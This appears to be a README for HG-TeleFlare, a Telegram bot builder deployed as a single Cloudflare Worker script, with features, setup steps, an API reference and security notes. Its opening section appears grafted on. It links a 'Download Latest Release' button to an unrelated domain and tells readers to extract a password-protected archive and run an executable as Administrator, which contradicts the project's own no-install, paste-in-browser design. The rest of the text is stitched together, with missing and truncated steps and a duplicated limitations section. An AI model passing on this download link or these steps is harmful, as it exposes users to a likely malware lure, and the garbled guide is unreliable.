<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

<div align="center">
  <img src="cover.png" alt="HG-TeleFlare — Telegram Bot Builder for Cloudflare Workers" width="100%">
  <br/>
  <h1>HG-TeleFlare</h1>
  <h3><em>The Zero-Config, Self-Bootstrapping Telegram Bot Builder for Cloudflare Workers</em></h3>
  <br/>
  <p align="center">
## 🆕 What's New in v1.4.0

| Area | Improvement |
|---|---|
| **📋 Send Form Summary** | New action that collects stored form fields and sends a formatted summary to **admin**, **user**, or **both** |
| **📥 Submissions inbox** | Dashboard tab to view, copy, and delete completed form results (KV + D1) |
| **🌐 Fetch API templates** | Choose **Raw JSON** or a **custom template** with `{key}`, nested paths, and `{json}` |
| **⚡ Subrequest-safe paths** | Lighter schema/migrations and submissions reads to stay within Workers free-plan limits |

> **Upgrade tip:** Paste the new `worker.js` into the **parent** Worker and deploy it, hard-refresh the dashboard, then click **🚀 Deploy** on **each bot** so child workers get form-summary + submissions support.

---

## ✨ Features

| Feature | Description |
|---|---|
| **🤖 Zero-Config Self-Bootstrapping** | Paste a Cloudflare API token, and HG-TeleFlare automatically creates its own **D1 Database** & **KV Storage**, runs schema migrations, and saves the config — no CLI, no manual setup. |
| **🎨 Visual Rule Builder** | Create bots using an intuitive drag-and-drop UI. Map **Triggers** (Commands, Messages, Callbacks, New Members, **On State**) to **Actions** (Send Message, Send Photo/Document, Keyboards, Fetch APIs, Store Data, Set/Clear State, **Send Form Summary**). |
| **⚡ Dynamic Worker Generation** | Click **"Deploy"** and HG-TeleFlare translates your visual rules into optimized, pure-JavaScript code, provisions a child Cloudflare Worker, and sets up the Telegram webhook — **instantly**. |
| **📁 Built-in Media Storage** | Upload images and documents in the dashboard (KV, up to 15MB). Pick files from the library when building Send Photo / Send Document rules. |
| **🔤 Dynamic Variables** | Personalize replies **and broadcasts** with `{first_name}`, `{username}`, `{last_name}`, `{user_id}`, `{chat_id}`, `{message}`, `{date}`. |
| **📊 Real-Time Log Viewer** | Monitor bot activity (D1 + KV), filter by level (DEBUG / INFO / WARNING / ERROR), and clear logs on demand. |
| **📥 Form Submissions Inbox** | Browse completed multi-step form results in the dashboard — view, copy, or delete. |
| **📋 Send Form Summary** | On the last form step, send a templated summary of stored keys to admin and/or the user, then optionally clear keys + state. |
| **🌐 Fetch API Reply Formats** | Return **raw JSON** or a **custom template** using API fields like `{setup}` / `{punchline}`. |
| **📦 Single-File Deployment** | The entire app — router, API client, dashboard UI, code generator — lives in one `worker.js`. No build step, no npm at runtime. |
| **🔄 Rule Reordering** | Drag and drop to reorder rules. Priority is managed automatically. |
| **📋 Rule Duplication** | Clone existing rules to speed up configuration. |
| **📤 Import / Export Templates** | Download a bot's rules as JSON, or import a shared template (append or replace). |
| **🎯 Advanced Trigger Matching** | Message/callback rules support **Contains**, **Exact**, **Starts With**, and **Regex**. |
| **📢 Broadcast / Newsletter** | Send personalized messages to everyone who has messaged your bot (auto-tracked via KV + live Worker). |
| **🔁 Multi-Step Forms** | **On State** triggers + **Set/Clear State** actions for conversational flows (KV-backed). |
| **⏳ Loading Feedback** | Buttons and pages show progress while slow actions run (deploy, logs, broadcast, save rule, auth). |
| **🔐 JWT Authentication** | Secure admin dashboard with JWT auth. First registration creates the only admin. Sign In / Sign Up support **Enter** to submit. |
| **🌐 Bilingual Meta Tags** | Built-in SEO support for **English** and **Persian (Farsi)**. |

---

## 🔮 Coming Features (برنامه‌های آینده)

> 🌟 **Full Persian (Farsi) Dashboard UI — Coming Soon!**
>
> We're working on a **fully translated Persian dashboard** so Iranian developers can use HG-TeleFlare entirely in their native language. Stay tuned! ❤️

| Feature | Status |
|---|---|
| **🇮🇷 Full Persian Dashboard UI** — Complete RTL interface with Persian translations | 🔜 Planned |
| **📱 Telegram Mini App Support** — Turn bots into Telegram Mini Apps | 📋 Planned |
| **🧩 Webhook Integrations** — Google Sheets, Zapier, and more | 📋 Planned |
| **📦 Pre-built Bot Template Library** — One-click templates on Import/Export | 📋 Planned |
| **📊 Advanced Analytics** — Usage trends and richer charts | 📋 Planned |
| **📬 Large-audience Broadcast Queue** — Batched sends beyond Workers free-plan subrequest limits | 📋 Planned |
| **🌍 Multi-language Bot Responses** — Auto-detect user language | 📋 Planned |

---

## 🚀 Quick Start (Deploy in 60 Seconds)

HG-TeleFlare requires **no** `npm install`, **no** Wrangler CLI, and **no** local environment. Everything runs on Cloudflare's edge.

## 📖 Full Deployment Guide (Step-by-Step)

This guide walks you through every single step — from creating a Cloudflare account to deploying your first bot. Follow along even if you've never used Cloudflare before.

---

### Step 2: Create a Cloudflare Worker

From the dashboard:

1. In the left sidebar, click **"Workers & Pages"**.

2. Click the **"Create application"** button (blue button, top-right).

3. On the next screen, you'll see two options:
   - **"Workers"** — serverless functions (select this).
   - **"Pages"** — full static sites (not this).
   
   Click **"Create Worker"** under the Workers section.

4. You'll now see the **"Create Worker"** form:
   - **Name:** Enter a name for your worker, e.g., `bot-builder-dashboard`.  
### Step 3: Open the Worker Editor

The Cloudflare **Workers Editor** is a fully online code editor. You'll see:

- A **file tree** on the left showing `worker.js` (the default template).
- A **code editor** in the center with the default template code already loaded.
- A **preview / console** panel at the bottom.
- A **"Save and Deploy"** button at the top.

📝 **Note:** The editor already created a default `worker.js` with a simple "Hello World" script. We're about to replace it with HG-TeleFlare.

---

### Step 4: Copy the Code from worker.js

Now open the `worker.js` file from this repository:

**Option A — Direct download (recommended):**
# If you've cloned this repo locally:
cd Cloudflare-Telegram-bot-builder
# Open worker.js in your code editor and copy all content
```

**Option C — Direct copy from this page:**
Scroll up, find the `worker.js` file content, select all, and copy it.

**Option D — Upload directly via Cloudflare editor:**
In the Cloudflare Workers editor, look for the file tree on the left side. Click the **upload icon** (or right-click → **Upload file**) and select the `worker.js` file you downloaded. This replaces the default `worker.js` with our file automatically.

---

### Step 5: Paste or Upload the Code into the Cloudflare Editor

**Option A — Paste (if you copied the text):**
1. Click anywhere inside the code editor.
2. **Select all existing code:** Press `Ctrl+A` (or `Cmd+A` on Mac).
3. **Delete the old code:** Press `Delete` or `Backspace`.
4. **Paste the new code:** Press `Ctrl+V` (or `Cmd+V` on Mac).
5. The editor now contains the full HG-TeleFlare application.

**Option B — Upload (if you saved worker.js to your computer):**
1. In the file tree panel on the left side of the Cloudflare editor, look for the current `worker.js` file.
2. Delete or rename the default `worker.js` (right-click → **Delete** or **Rename**).
3. Click the **Upload** button (usually a cloud icon or a `+` icon) in the file tree.
4. Select your downloaded `worker.js` file from your computer.
5. The file will appear in the file tree with the full HG-TeleFlare code loaded.

**Either way**, you'll see the full application loaded. You should see the file size indicator — it's a single file, no external dependencies needed.

---

### Step 6: Save and Deploy

1. Click the **"Save and Deploy"** button at the top of the editor.

2. Wait for the deployment to complete (usually 5–10 seconds). You'll see:
   ```
   🚀 Deployment complete!
   Your worker has been deployed at:
### Step 7: Create a Cloudflare API Token

The setup wizard needs a Cloudflare API Token with permissions to create D1 databases, KV namespaces, and Workers. Here's how to create one:

### Step 8: Complete the Setup Wizard

Now go back to your Worker URL (the one from Step 6).

1. You'll see the **HG-TeleFlare Setup Wizard** page with a clean UI asking for your Cloudflare credentials.

2. **Step 2.1 — Enter your Cloudflare Account ID:**
   - Your **Account ID** is in the Cloudflare Dashboard URL:  
### Step 9: Register Your Admin Account

1. After initialization, the wizard will show the **Registration Form**.

2. Fill in your admin credentials:
   - **Username:** Choose a username (e.g., `admin`).
   - **Password:** Must be at least 6 characters.  
     🔐 This is your admin password — choose something strong!

3. Click **"Register"**.

4. You'll be automatically logged in and redirected to the **Dashboard**.

📝 **Note:** Registration is **one-time only**. The first account created is the **admin**. After that, registration is locked for security. Only the admin can log in.

---

### Step 10: Start Building Bots!

You're now inside the **HG-TeleFlare Dashboard**. Here's what to do next:

#### 10.2 — Add Your Bot to HG-TeleFlare

1. In the dashboard, click **"Create Bot"**.
2. Paste your **bot token** from BotFather.
3. Click **"Verify & Add"**. The system will:
   - Verify the token with Telegram.
   - Save your bot with its name and username.

#### 10.3 — Add Rules to Your Bot

1. Click on your bot in the dashboard.
2. Click **"Add Rule"**.
3. Configure a trigger:
   - **Command:** e.g., `/start`
   - **Message:** e.g., "hello"
   - **Callback:** for inline button clicks
   - **New Member:** when someone joins a group
4. Configure an action:
   - **Send Message:** Reply with text (use `{first_name}`, `{username}`, etc.)
   - **Send Photo / Document:** From your media library
   - **Show Keyboard:** Display custom buttons
   - **Fetch API:** Call an external API — raw JSON or a custom reply template
   - **Store Data:** Save data to KV storage
   - **Send Form Summary:** Collect stored keys and notify admin / user
   - **Set / Clear State:** Drive multi-step conversations
5. Click **"Save Rule"**.

#### 10.4 — Deploy Your Bot

1. Click the **"Deploy"** button.
2. HG-TeleFlare will:
   - Generate optimized JavaScript code from your rules.
   - Create a new Cloudflare Worker for your bot.
   - Set up the Telegram webhook automatically.
3. **Your bot is live!** 🎉 Test it by sending a message on Telegram.

#### 10.5 — Monitor, Broadcast, Submissions & Upgrade

1. Open the **"Logs"** tab for real-time activity (KV + D1).
2. Use **Broadcast** to message subscribers (personalize with `{first_name}`, etc.).
3. Open **Submissions** to review completed form results.
4. After upgrading `worker.js` on the parent Worker, **Deploy each bot again** so child Workers get the latest runtime.

---

## 📸 Screenshots

### Setup Wizard

| Step | Screenshot | Description |
|------|------------|-------------|
### Dashboard

| Preview | Description |
|---|---|
## 🏗️ Architecture

<div align="center">
  <img src="./diagram.png" alt="HG-TeleFlare Architecture Diagram" width="920" />
  <p><em>High-level architecture of HG-TeleFlare (Router, Dashboard, Bot Generator, CFClient, and storage/services).</em></p>
</div>

### Data Flow

1. **User** visits the dashboard → **Router** serves SPA HTML.
2. **User** creates rules visually → **Dashboard** sends API requests.
3. **User** clicks "Deploy" → **Bot Code Gen** generates JavaScript code.
4. **CFClient** provisions a new Cloudflare Worker with the bot code.
5. **CFClient** sets up the Telegram webhook → Bot is live!
6. **Bot** receives messages → Processes rules → Sends Telegram API calls.
7. **Bot** writes activity logs and tracks users → Parent stores in **KV** (primary) + **D1** (backup / relational).
8. **Broadcast** → Parent asks the child Worker to resolve the audience and send (keeps parent subrequests low).

### Storage

| Service | Purpose |
|---|---|
| **D1 (SQLite)** | Relational data — Users, Bots, Rules, Media metadata, log backups |
| **KV** | Media files, session state, aggregated logs (`botlogs:{id}`), subscriber keys / maps |
| **Workers** | Parent dashboard + dynamically deployed child bot Workers |

---

## 📖 API Reference

### Authentication

All endpoints except setup, login, register, and media file serving require a `Bearer` JWT token:

```
Authorization: Bearer <jwt-token>
```

### Bot Management

| Method | Endpoint | Description |
|---|---|---|
| `GET` | `/api/bots` | List all bots for authenticated user |
| `POST` | `/api/bots` | Create a new bot (provide `botToken`) |
| `GET` | `/api/bots/:id` | Get bot details with rules |
| `PUT` | `/api/bots/:id` | Update bot token |
| `DELETE` | `/api/bots/:id` | Delete bot and its rules |

### Rule Management

| Method | Endpoint | Description |
|---|---|---|
| `POST` | `/api/bots/:id/rules` | Create a new rule |
| `PUT` | `/api/rules/:id` | Update a rule |
| `DELETE` | `/api/rules/:id` | Delete a rule |
| `POST` | `/api/rules/:id/duplicate` | Duplicate a rule |
| `POST` | `/api/bots/:id/rules/reorder` | Reorder rules (drag-and-drop) |
| `GET` | `/api/bots/:id/export` | Export bot rules as a JSON template |
| `POST` | `/api/bots/:id/import` | Import rules (`{ rules, mode: "append"\|"replace" }`) |
| `GET` | `/api/bots/:id/users` | List tracked Telegram users for a bot |
| `POST` | `/api/bots/:id/users/track` | Internal — child worker registers a user |
| `POST` | `/api/bots/:id/broadcast` | Broadcast text/photo (personalization vars supported; ~40 recipients / request on free plan) |

### Form Submissions

| Method | Endpoint | Description |
|---|---|---|
| `GET` | `/api/bots/:id/submissions` | List recent form submissions |
| `DELETE` | `/api/bots/:id/submissions` | Clear all submissions for a bot |
| `DELETE` | `/api/bots/:id/submissions/:subId` | Delete one submission |
| `POST` | `/api/bots/:id/submissions/ingest` | Internal — child worker saves a completed form |

### Media Management

| Method | Endpoint | Description |
|---|---|---|
| `POST` | `/api/media/upload` | Upload a file (multipart form, max 15MB) |
| `GET` | `/api/bots/:id/media` | List media for a bot |
| `DELETE` | `/api/media/:id` | Delete media (marks affected rules) |
| `PUT` | `/api/media/:id` | Rename media file |
| `GET` | `/api/media/:id/file` | Serve media file |

### Logging

| Method | Endpoint | Description |
|---|---|---|
| `GET` | `/api/bots/:id/logs` | Fetch logs (optional `?level=ERROR&limit=50`) |
| `DELETE` | `/api/bots/:id/logs` | Clear all logs for a bot |
| `GET` | `/api/bots/:id/logs/stats` | Get log statistics |
| `POST` | `/api/logs/:id` | Internal — receive logs from deployed bots |

### Setup & Auth

| Method | Endpoint | Description |
|---|---|---|
| `GET` | `/api/setup/status` | Check if platform is configured |
| `POST` | `/api/setup/init` | Initialize D1, KV, and migrations |
| `POST` | `/api/setup/verify-token` | Verify a Cloudflare API token |
| `POST` | `/api/register` | Register first admin user |
| `POST` | `/api/login` | Login with credentials |

---

## 🔒 Security

- **API Token Storage:** Cloudflare API tokens are stored in Worker secrets (`PLATFORM_CONFIG`), never exposed to clients after initial setup.
- **Password Hashing:** Passwords are hashed with SHA-256 + salt before storage.
- **JWT Authentication:** Dashboard sessions use signed JWTs with 7-day expiry.
- **JWT Secret:** Set a Worker secret named `JWT_SECRET` to a long random value. If you skip this, the app falls back to a built-in default — fine for quick testing, **not** for a public deployment.
- **Auto-Lock:** Admin registration locks after the first user is created — no unauthorized signups.
- **Bot Verification:** Log ingestion endpoints verify the sender's bot token before accepting data.
- **Media Access:** `/api/media/:id/file` is **intentionally public**. Telegram (and browsers) must fetch image/file URLs without a dashboard login. Treat media URLs as unguessable-but-public links; do not upload confidential documents.

### Set `JWT_SECRET` (recommended)

1. Cloudflare Dashboard → your Worker → **Settings** → **Variables and Secrets**.
2. Add a secret: name `JWT_SECRET`, value = a long random string.
3. Save / redeploy if prompted.

---

## ⚠️ Known Limitations

| Limitation | Details |
|---|---|
| **Single admin** | Only the first registered user exists; registration locks afterward. |
| **No password reset** | If you lose admin credentials, you must recover via D1 / redeploy. |
| **Media size** | Max **15MB** per file (KV + Base64 overhead). |
| **Broadcast batch size** | Free-plan Workers have a low **subrequest** budget. Broadcasts send up to **~40 recipients per request**; larger audiences need multiple sends or a future queue. |
| **KV eventual consistency** | Fresh logs / subscribers can lag a few seconds after list writes. Aggregated keys reduce this; hard-refresh if counts look stale. |
| **Redeploy child bots after upgrade** | Parent `worker.js` updates alone do not refresh already-deployed bots. Click **Deploy** on each bot after upgrading. |
| **Cloudflare Free plan** | ~100k Worker requests/day; child bot Workers count toward limits. |
| **Paste-deploy only** | No local Wrangler workflow in this repo — edit and redeploy `worker.js`. |

## 🌐 Bilingual Support (English / فارسی)

HG-TeleFlare includes comprehensive SEO metadata in **two languages**:

| Language | Meta Tags | Open Graph |
|---|---|---|
| **English** | ✅ description, keywords, title, author | ✅ og:title, og:description |
| **Persian (فارسی)** | ✅ `lang="fa"` description, keywords | ✅ og:title:fa, og:locale:alternate=fa_IR |

The dashboard HTML includes:
- Bilingual `<meta>` description and keywords tags
- Open Graph tags for both languages
- Twitter Card tags for social sharing
- JSON-LD structured data (Schema.org) for search engines
- Canonical URL reference

---

## 🤝 Contributing

Contributions are welcome! Here's how you can help:

## 📝 Changelog

### v1.4.0
- **Send Form Summary** action (admin / user / both, templates, optional clear keys + state)
- **Submissions inbox** in the dashboard (view / copy / delete)
- **Fetch API** reply formats: raw JSON or custom `{key}` templates
- Cover image + README polish; subrequest-safer submissions/schema paths

### v1.3.0
- Import / Export rule templates; advanced match types (contains / exact / starts with / regex)
- Multi-step forms (**On State**, **Set / Clear State**)
- **Broadcast** to subscribers with personalization; reliable KV + child-Worker audience (~40/request free-plan cap)
- **KV-backed logs & subscribers**; dashboard stats count KV logs
- Media picker preserves rule form; loading states on slow actions; Enter-to-submit auth

### v1.0.0
- Initial paste-and-deploy release: self-bootstrap, visual rules, deploy, media, logs, JWT admin

---

## 📬 Contact

**Hamed Gharghi** — Creator & Maintainer

## 🇮🇷 پیامی برای کاربران ایرانی

<div align="right" dir="rtl">

### به HG-TeleFlare خوش آمدید

سلام به همهٔ دوستان و توسعه‌دهندگان ایرانی.

من **حامد** هستم، سازندهٔ این پروژه. HG-TeleFlare با این هدف ساخته شده که بتوانید بدون نیاز به دانش برنامه‌نویسی، ربات تلگرام خود را بسازید و روی Cloudflare مستقر کنید.

**برنامهٔ بعدی:** در نسخهٔ آینده، رابط کامل داشبورد به‌صورت فارسی و راست‌چین ارائه خواهد شد تا کار با ابزار برای کاربران فارسی‌زبان ساده‌تر شود.

## 📋 نسخه فارسی

<div align="right" dir="rtl">

**اچ‌جی-تل‌فلر (HG-TeleFlare)** یک ابزار مستقل برای Cloudflare Workers است که امکان ساخت، مدیریت و انتشار ربات‌های تلگرام را به‌صورت بصری و بدون نوشتن کد فراهم می‌کند.

### ویژگی‌ها

- **راه‌اندازی خودکار:** با یک توکن API کلادفلر، پایگاه داده D1 و فضای ذخیره‌سازی KV به‌صورت خودکار ایجاد و آماده می‌شود.
- **سازنده بصری قوانین:** با رابط کشیدن و رها کردن، ماشه‌ها (دستورات، پیام‌ها، کاربران جدید) را به اقدامات (ارسال پیام، نمایش کیبورد، فراخوانی API) متصل کنید.
- **تولید و انتشار Worker:** با یک کلیک، کد جاوااسکریپت تولید و روی شبکه Cloudflare مستقر می‌شود.
- **ذخیره‌سازی رسانه:** تصاویر و فایل‌ها را مستقیماً از داشبورد آپلود کنید.
- **مشاهدهٔ لاگ‌ها:** فعالیت ربات را به‌صورت لحظه‌ای پیگیری کنید.
- **ارسال همگانی:** پیام شخصی‌سازی‌شده به مخاطبان ربات (با محدودیت تعداد در هر درخواست روی پلن رایگان).
- **ورود و خروج قالب قوانین:** اشتراک‌گذاری قوانین به‌صورت JSON.

### مجوز

این پروژه تحت مجوز MIT منتشر شده است.

</div>

---

<div align="center">
  <br/>
  <sub>Built with Cloudflare Workers</sub>
  <br/>
  <br/>
  <sub>


---

## Hardening Checklist (Production)

1. **Set `JWT_SECRET`** — Add a Worker secret named `JWT_SECRET` with a long random value. Without it, the app uses a built-in fallback suitable only for testing.
2. **Protect your Cloudflare API token** — Use least privilege (Workers Scripts/Routes Edit, D1 Edit, Workers KV Storage Edit). Rotate if exposed.
3. **Protect Telegram bot tokens** — Treat them like passwords; anyone with a token can control the bot.
4. **Strong admin password** — There is no password-reset flow in v1.
5. **Media is public by URL** — `/api/media/:id/file` has no dashboard auth so Telegram can download files. Do not upload secrets or private documents.

---

## Known Limitations (v1.3)

| Topic | Limitation |
|---|---|
| **Accounts** | Single admin only. First registration becomes admin; further signups are locked. |
| **Password recovery** | No built-in reset. Recovery means editing D1 data or redeploying with a fresh setup. |
| **Media size** | Maximum **15MB** per file (KV value limits + Base64 encoding overhead). |
| **Media privacy** | Media file endpoints are intentionally **public**. URLs are not listed publicly, but anyone who has the URL can fetch the file. |
| **Broadcast** | Free-plan Workers have a limited subrequest budget. Broadcasts typically send up to **~40 recipients per request**. |
| **KV consistency** | Log and subscriber lists can lag briefly after writes (eventual consistency). |
| **Child Workers** | Upgrading the parent `worker.js` does not update already-deployed bots until you click **Deploy** again. |
| **Cloudflare Free plan** | Roughly **100,000 Worker requests/day**. Each deployed bot runs as its own Worker and shares account quotas. |
| **Deploy model** | Paste-and-deploy (`worker.js` into the Cloudflare editor). This repo does not ship Wrangler/npm local tooling. |
| **Password hashing** | SHA-256 with a fixed application salt — adequate for a personal admin panel, not a multi-tenant SaaS password store. |
| **Sessions** | JWTs expire after **7 days**. |

---

## What Is Protected

- Dashboard API routes (bots, rules, uploads, deploy) require a valid JWT (or equivalent auth).
- Cloudflare credentials are stored in the Worker secret `PLATFORM_CONFIG` after setup.
- Bot log ingestion checks the bot identity before accepting logs.
- Admin registration is one-time after the first user exists.


---

MIT License

Copyright (c) 2026 Hamed

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
